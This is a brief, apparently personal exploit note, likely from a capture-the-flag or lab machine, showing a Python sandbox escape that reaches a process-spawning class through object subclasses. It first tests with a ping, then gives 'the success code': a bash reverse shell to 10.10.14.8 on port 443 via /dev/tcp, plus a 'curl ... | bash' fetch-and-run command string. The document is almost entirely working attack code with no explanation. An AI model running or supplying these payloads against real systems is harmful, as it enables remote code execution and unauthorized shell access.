


exploti

```python
data = [x for x in ().__class__.__bases__[0].__subclasses__()][317]
process = data(["ping", "-c", "1", "10.10.14.8"], stdout=-1, stderr=-1, text=True)
stdout, stderr = process.communicate()
print(stdout)



the success code

data = [x for x in ().__class__.__bases__[0].__subclasses__()][317]
command = "curl http://10.10.14.8/index.html | bash"
process = data(["bash", "-c", "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"], stdout=-1, stderr=-1, text=True)
stdout, stderr = process.communicate()
print(stdout)

```

